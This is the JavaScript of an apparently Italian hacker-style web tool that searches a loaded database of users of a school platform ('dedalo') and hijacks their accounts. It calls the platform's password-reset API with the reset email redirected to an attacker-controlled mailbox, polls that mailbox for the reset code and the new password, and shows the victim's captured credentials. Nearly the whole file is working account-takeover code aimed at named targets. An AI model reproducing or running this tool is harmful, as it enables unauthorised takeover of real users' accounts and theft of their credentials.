        .led {

        }

        .led.wait {

        @keyframes pulse {

        // ============================================================
        // FUNZIONI DI LOG
        // ============================================================
        function log(msg, type = 'normal') {
            const line = document.createElement('div');
            line.className = `line ${type}`;
            line.innerHTML = msg;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function logDebug(msg) {
            const line = document.createElement('div');
            line.className = 'line-debug';
            line.innerHTML = `🔍 DEBUG: ${msg}`;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function logResponse(responseText, step) {
            const line = document.createElement('div');
            line.className = 'line-response';
            
            let formattedResponse = '';
            try {
                const json = JSON.parse(responseText);
                formattedResponse = JSON.stringify(json, null, 2);
            } catch {
                formattedResponse = responseText;
            }
            
            line.innerHTML = `
                <span class="info">📡 RESPONSE ${step}:</span>
                <pre>${formattedResponse}</pre>
            `;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
            
            return responseText;
        }

        function loading(msg) {
            const line = document.createElement('div');
            line.className = 'line wait';
            line.innerHTML = msg + ' <span class="cursor"></span>';
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function setStatus(state, text) {
            led.className = `led ${state}`;
            statusText.textContent = text;
        }

        function clearConsole() {
            terminal.innerHTML = '';
        }

        function checkPassword() {
            const pwd = accessPassword.value.trim();
            
            if (pwd === ACCESS_PASSWORD) {
                isLoggedIn = true;
                loginArea.style.display = 'none';
                searchSection.style.display = 'block';
                attackSection.style.display = 'block';
                setStatus('active', 'ACCESS GRANTED');

                statsDisplay.textContent = `DB: ${database.length} records`;
                dbStats.textContent = `${database.length} utenti`;
                
                log('✅ ACCESSO CONSENTITO - Database caricato', 'success');
                log(`📊 TOTALE RECORD: ${database.length}`, 'info');
                log('🔍 Usa il motore di ricerca per trovare target', 'info');
                log('⚡ Poi clicca su un risultato per caricare username nell\'attacco', 'wait');
                
                // Setup autocomplete
                setupAutocomplete();
            } else {
                setStatus('active', 'ACCESS DENIED');
                log('❌ PASSWORD ERRATA - Accesso negato', 'error');
                accessPassword.value = '';
            }
        }

        // ============================================================
        // FUNZIONI DI RICERCA
        // ============================================================
        function searchDatabase(query) {
            if (!query || query.length < 2) return [];
            
            const lowerQuery = query.toLowerCase();
            const results = [];
            
            database.forEach(user => {
                const username = `dedaloroma${user.id}`;
                const matchId = user.id.includes(query) || username.includes(lowerQuery);
                const matchEmail1 = user.email1.toLowerCase().includes(lowerQuery);
                const matchEmail2 = user.email2.toLowerCase().includes(lowerQuery);
                
                if (matchId || matchEmail1 || matchEmail2) {
                    results.push(user);
                }
            });
            
            return results.slice(0, 15); // Limita a 15 risultati
        }

        function displayResults(results) {
            if (results.length === 0) {
                resultsArea.innerHTML = '<div class="result-item" style="color: #f00;">❌ Nessun risultato trovato</div>';
                return;
            }
            
            let html = '';
            results.forEach(user => {
                const username = `dedaloroma${user.id}`;
                html += `
                    <div class="result-item" onclick="selectTarget('${username}')">
                        <div class="main-info">
                            <span class="badge">🔸 ${username}</span>
                            <span class="email-preview">📧 ${user.email1}</span>
                        </div>
                        <div class="email-preview" style="margin-left: 25px;">📧 ${user.email2}</div>
                    </div>
                `;
            });
            
            resultsArea.innerHTML = html;
        }

        function selectTarget(username) {
            attackUsername.value = username;
            log(`🎯 Target selezionato: ${username}`, 'success');
            
            // Scroll alla sezione attacco
            attackSection.scrollIntoView({ behavior: 'smooth' });
            
            // Evidenziazione temporanea
            attackUsername.style.borderColor = '#ff0';
            setTimeout(() => {
                attackUsername.style.borderColor = '#0f0';
            }, 1000);
        }

        function setupAutocomplete() {
            searchInput.addEventListener('input', function() {
                const value = this.value.trim();
                
                if (value.length < 2) {
                    autocompleteList.classList.remove('visible');
                    resultsArea.innerHTML = '';
                    return;
                }
                
                const results = searchDatabase(value);
                
                if (results.length > 0) {
                    // Mostra risultati nell'area dedicata
                    displayResults(results);
                    
                    // Mostra anche autocomplete rapido
                    autocompleteList.innerHTML = results.slice(0, 5).map(user => 
                        `<div class="autocomplete-item" onclick="selectTarget('dedaloroma${user.id}')">
                            <span class="id">dedaloroma${user.id}</span>
                            <span class="email">${user.email1}</span>
                        </div>`
                    ).join('');
                    autocompleteList.classList.add('visible');
                } else {
                    autocompleteList.classList.remove('visible');
                    resultsArea.innerHTML = '<div class="result-item" style="color: #f00;">❌ Nessun risultato trovato</div>';
                }
            });

            // Nascondi autocomplete quando si clicca fuori
            document.addEventListener('click', function(e) {
                if (!searchInput.contains(e.target) && !autocompleteList.contains(e.target)) {
                    autocompleteList.classList.remove('visible');
                }
            });
        }

        // ============================================================
        // FUNZIONI EMAIL (ATTACCO)
        // ============================================================
        function getMailHeaders(token = null) {
            const headers = { ...FIXED_HEADERS };
            if (token) {
                headers['Authorization'] = `Bearer ${token}`;
            }
            return headers;
        }

        async function authEmail() {
            try {
                const res = await fetch(`${BASE_MAIL}/token`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        ...FIXED_HEADERS
                    },
                    body: JSON.stringify({ address: EMAIL, password: EMAIL_PASSWORD })
                });
                
                if (!res.ok) throw new Error('Auth failed');
                const data = await res.json();
                emailToken = data.token;
                
                await updateLastMessageId();
                
                return true;
            } catch (e) {
                logDebug(`Email auth error: ${e.message}`);
                return false;
            }
        }

        async function updateLastMessageId() {
            try {
                const res = await fetch(`${BASE_MAIL}/messages`, {
                    headers: getMailHeaders(emailToken)
                });
                
                if (res.ok) {
                    const data = await res.json();
                    if (data['hydra:member'] && data['hydra:member'].length > 0) {
                        const messages = data['hydra:member'];
                        const latestMsg = messages[messages.length - 1];
                        lastMessageId = latestMsg.id;
                        logDebug(`Ultimo messaggio ID: ${lastMessageId}`);
                    }
                }
            } catch (e) {
                logDebug(`Errore update last message: ${e.message}`);
            }
        }

        async function getNewMessages() {
            if (!emailToken && !(await authEmail())) return null;
            
            try {
                const res = await fetch(`${BASE_MAIL}/messages`, {
                    headers: getMailHeaders(emailToken)
                });
                
                if (!res.ok) throw new Error('Failed');
                const data = await res.json();
                
                if (!data['hydra:member']) return [];
                
                const messages = data['hydra:member'];
                const newMessages = [];
                
                for (const msg of messages) {
                    if (!lastMessageId || msg.id > lastMessageId) {
                        newMessages.push(msg);
                    }
                }
                
                if (newMessages.length > 0) {
                    lastMessageId = newMessages[newMessages.length - 1].id;
                }
                
                return newMessages;
                
            } catch (e) {
                emailToken = null;
                return null;
            }
        }

        async function readMessage(msgId) {
            try {
                const res = await fetch(`${BASE_MAIL}/messages/${msgId}`, {
                    headers: getMailHeaders(emailToken)
                });
                if (!res.ok) throw new Error('Failed');
                return await res.json();
            } catch (e) {
                return null;
            }
        }

        function extractCode(text) {
            const match = text.match(/[A-Z0-9]{3}-[A-Z0-9]{3}/i);
            if (match) {
                return match[0].toUpperCase();
            }
            
            const words = text.match(/\S+/g) || [];
            for (const w of words) {
                if (w.includes('-')) {
                    const clean = w.replace(/[^A-Z0-9-]/gi, '').toUpperCase();
                    if (clean.length === 7 && clean.includes('-')) {
                        return clean;
                    }
                }
            }
            return null;
        }

        function extractPassword(text) {
            const words = text.match(/\S+/g) || [];
            for (const w of words) {
                const word = w.trim();
                if (word.length >= 5 && word.length <= 15 &&
                    /[A-Za-z]/.test(word) && /[0-9]/.test(word) &&
                    !/password|codice|reset|step|dedalo|messaggio|non|rispondere|email|questa|risposta|automatica|wec|system|nuova/i.test(word.toLowerCase())) {
                    return word;
                }
            }
            return null;
        }

        async function checkForNewCodes(currentCode) {
            logDebug('🔍 DOPPIO CHECK CODICE: verifico se ci sono nuovi codici...');
            
            await new Promise(r => setTimeout(r, 10000));
            
            for (let i = 1; i <= 4; i++) {
                logDebug(`Check codice ${i}/4: controllo nuovi messaggi...`);
                
                const newMessages = await getNewMessages();
                
                if (newMessages && newMessages.length > 0) {
                    for (const msg of newMessages) {
                        const msgData = await readMessage(msg.id);
                        if (!msgData) continue;
                        
                        const text = msgData.text || '';
                        const newCode = extractCode(text);
                        
                        if (newCode && newCode !== currentCode) {
                            logDebug(`⚠️ Trovato NUOVO codice: ${newCode} (diverso da ${currentCode})`);
                            return newCode;
                        }
                    }
                }
                
                if (i < 4) {
                    logDebug(`Check codice ${i}/4 completato, aspetto 2 secondi...`);
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            
            logDebug('✅ DOPPIO CHECK CODICE: nessun nuovo codice trovato, uso quello corrente');
            return currentCode;
        }

        async function checkForNewPasswords(currentPassword) {
            logDebug('🔍 DOPPIO CHECK PASSWORD: verifico se ci sono nuove password...');
            
            await new Promise(r => setTimeout(r, 10000));
            
            for (let i = 1; i <= 4; i++) {
                logDebug(`Check password ${i}/4: controllo nuovi messaggi...`);
                
                const newMessages = await getNewMessages();
                
                if (newMessages && newMessages.length > 0) {
                    for (const msg of newMessages) {
                        const msgData = await readMessage(msg.id);
                        if (!msgData) continue;
                        
                        const text = msgData.text || '';
                        const newPassword = extractPassword(text);
                        
                        if (newPassword && newPassword !== currentPassword) {
                            logDebug(`⚠️ Trovata NUOVA password: ${newPassword} (diversa da ${currentPassword})`);
                            return newPassword;
                        }
                    }
                }
                
                if (i < 4) {
                    logDebug(`Check password ${i}/4 completato, aspetto 2 secondi...`);
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            
            logDebug('✅ DOPPIO CHECK PASSWORD: nessuna nuova password trovata, uso quella corrente');
            return currentPassword;
        }

        async function waitForCodeWithDoubleCheck(timeout = 60) {
            const start = Date.now();
            let foundCode = null;
            let foundMessageId = null;
            
            while ((Date.now() - start) / 1000 < timeout && !foundCode) {
                const newMessages = await getNewMessages();
                
                if (newMessages && newMessages.length > 0) {
                    for (const msg of newMessages) {
                        const msgId = msg['id'];
                        
                        if (seenMessages.has(msgId)) continue;
                        
                        const msgData = await readMessage(msgId);
                        if (!msgData) continue;
                        
                        const text = msgData.text || '';
                        const subject = msgData.subject || '';
                        
                        logDebug(`Trovata email: ${subject}`);
                        
                        const code = extractCode(text);
                        if (code) {
                            foundCode = code;
                            foundMessageId = msgId;
                            logDebug(`✅ PRIMO CODICE TROVATO: ${code}`);
                            break;
                        }
                    }
                }
                
                if (!foundCode) {
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            
            if (!foundCode) {
                return null;
            }
            
            log('⏳ DOPPIO CHECK CODICE: aspetto 10 secondi per vedere se arriva un altro codice...', 'wait');
            
            const finalCode = await checkForNewCodes(foundCode);
            
            if (finalCode !== foundCode) {
                log(`⚠️ Usato l'ULTIMO codice: ${finalCode} (invece di ${foundCode})`, 'warning');
            } else {
                log(`✓ Confermato ULTIMO codice: ${finalCode}`, 'success');
            }
            
            seenMessages.add(foundMessageId);
            
            return finalCode;
        }

        async function waitForPasswordWithDoubleCheck(timeout = 60) {
            const start = Date.now();
            let foundPassword = null;
            let foundMessageId = null;
            
            while ((Date.now() - start) / 1000 < timeout && !foundPassword) {
                const newMessages = await getNewMessages();
                
                if (newMessages && newMessages.length > 0) {
                    for (const msg of newMessages) {
                        const msgId = msg['id'];
                        
                        if (seenMessages.has(msgId)) continue;
                        
                        const msgData = await readMessage(msgId);
                        if (!msgData) continue;
                        
                        const text = msgData.text || '';
                        
                        const pwd = extractPassword(text);
                        if (pwd) {
                            foundPassword = pwd;
                            foundMessageId = msgId;
                            logDebug(`✅ PRIMA PASSWORD TROVATA: ${pwd}`);
                            break;
                        }
                    }
                }
                
                if (!foundPassword) {
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            
            if (!foundPassword) {
                return null;
            }
            
            log('⏳ DOPPIO CHECK PASSWORD: aspetto 10 secondi per vedere se arriva un\'altra password...', 'wait');
            
            const finalPassword = await checkForNewPasswords(foundPassword);
            
            if (finalPassword !== foundPassword) {
                log(`⚠️ Usata l'ULTIMA password: ${finalPassword} (invece di ${foundPassword})`, 'warning');
            } else {
                log(`✓ Confermata ULTIMA password: ${finalPassword}`, 'success');
            }
            
            seenMessages.add(foundMessageId);
            
            return finalPassword;
        }

        async function step1(username) {
            log('▶ STEP 1: REQUEST RESET');
            
            const payload = {
                "nomeSP": "AAUSRT_setCodiceReset",
                "username": username,
                "stepReset": "0",
                "nomeScuola": "dedalo",
                "indirizzoEmailTo": EMAIL
            };
            
            log(`UA FISSO: ${FIXED_HEADERS['User-Agent']}`, 'wait');
            
            try {
                const res = await fetch(URL_RESET, {
                    method: 'POST',
                    headers: FIXED_HEADERS,
                    body: JSON.stringify(payload)
                });
                
                const responseText = await res.text();
                logResponse(responseText, 'STEP 1');
                
                if (res.ok) {
                    log('✓ RESET REQUEST SENT', 'success');
                    return true;
                } else {
                    log('✗ REQUEST FAILED', 'error');
                    return false;
                }
            } catch (e) {
                log(`✗ ERROR: ${e.message}`, 'error');
                return false;
            }
        }

        async function step2(username, code) {
            log('▶ STEP 2: VERIFY CODE');
            
            const cleanCode = code.replace(/\s+/g, '').toUpperCase();
            
            const payload = {
                "username": username,
                "stepReset": "1",
                "nomeScuola": "dedalo",
                "codiceReset": cleanCode,
                "indirizzoEmailTo": EMAIL
            };
            
            log(`UA FISSO: ${FIXED_HEADERS['User-Agent']}`, 'wait');
            
            try {
                const res = await fetch(URL_RESET, {
                    method: 'POST',
                    headers: FIXED_HEADERS,
                    body: JSON.stringify(payload)
                });
                
                const responseText = await res.text();
                logResponse(responseText, 'STEP 2');
                
                try {
                    const response = JSON.parse(responseText);
                    
                    if (response.message === "Reset password effettuata" || 
                        (response.message && response.message.includes("Reset password effettuata"))) {
                        
                        log('✅ Reset password effettuata!', 'success');
                        return true;
                    } else if (response.esito === "OK" || 
                        response.ok === true || 
                        response.success === true ||
                        response.status === "OK") {
                        
                        log('✓ CODE VERIFIED', 'success');
                        return true;
                    } else {
                        const errorMsg = response.messaggio || response.message || response.errore || 'Verification failed';
                        log(`✗ ${errorMsg}`, 'error');
                        return false;
                    }
                } catch (e) {
                    if (responseText.includes("Reset password effettuata")) {
                        log('✅ Reset password effettuata!', 'success');
                        return true;
                    } else if (responseText.includes("OK") || responseText.includes("ok")) {
                        log('✓ CODE VERIFIED', 'success');
                        return true;
                    } else {
                        log(`✗ VERIFICATION FAILED`, 'error');
                        return false;
                    }
                }
            } catch (e) {
                log(`✗ ERROR: ${e.message}`, 'error');
                return false;
            }
        }

        // Funzione principale di attacco
        async function startAttack() {
            if (processing) return;
            
            const username = attackUsername.value.trim();
            if (!username) {
                log('ERROR: username required', 'error');
                return;
            }
            
            processing = true;
            startAttackBtn.disabled = true;
            resultBox.classList.remove('show');
            setStatus('active', 'ATTACK IN PROGRESS');
            lastMessageId = null;
            
            clearConsole();
            log(`🎯 TARGET: ${username}`);
            log(`📧 EMAIL: ${EMAIL}`);
            
            try {
                setStatus('active', 'AUTH');
                if (!(await authEmail())) {
                    throw new Error('Email auth failed');
                }
                log('✓ EMAIL AUTH', 'success');
                
                setStatus('active', 'STEP 1');
                if (!(await step1(username))) {
                    throw new Error('Step 1 failed');
                }
                
                setStatus('wait', 'WAIT CODE');
                loading('WAITING FOR CODE');
                const code = await waitForCodeWithDoubleCheck(60);
                
                if (!code) {
                    throw new Error('No code received');
                }
                log(`✓ ULTIMO CODICE: ${code}`, 'success');
                
                setStatus('active', 'STEP 2');
                await new Promise(r => setTimeout(r, 1000));
                
                if (!(await step2(username, code))) {
                    throw new Error('Step 2 failed');
                }
                
                setStatus('wait', 'WAIT PASSWORD');
                loading('WAITING FOR PASSWORD WITH DOUBLE CHECK');
                const password = await waitForPasswordWithDoubleCheck(60);
                
                if (!password) {
                    throw new Error('No password received');
                }
                log(`✓ PASSWORD FINALE: ${password}`, 'success');
                
                setStatus('active', 'DONE');
                resultUsername.textContent = username;
                resultPassword.textContent = password;
                resultBox.classList.add('show');
                log('✓ RESET COMPLETE', 'success');
                
            } catch (e) {
                log(`✗ ${e.message}`, 'error');
                setStatus('active', 'ERROR');
            } finally {
                processing = false;
                startAttackBtn.disabled = false;
            }
        }

        // Enter key per ricerca
        searchInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && isLoggedIn) {
                const results = searchDatabase(searchInput.value.trim());
                displayResults(results);
            }
        });

        // Messaggio iniziale
        log('⎈ TERMINAL WEC RESET v8.0', 'info');
        log('Inserisci la password di accesso per continuare...', 'wait');
        setStatus('active', 'ACCESS LOCKED');
    </script>
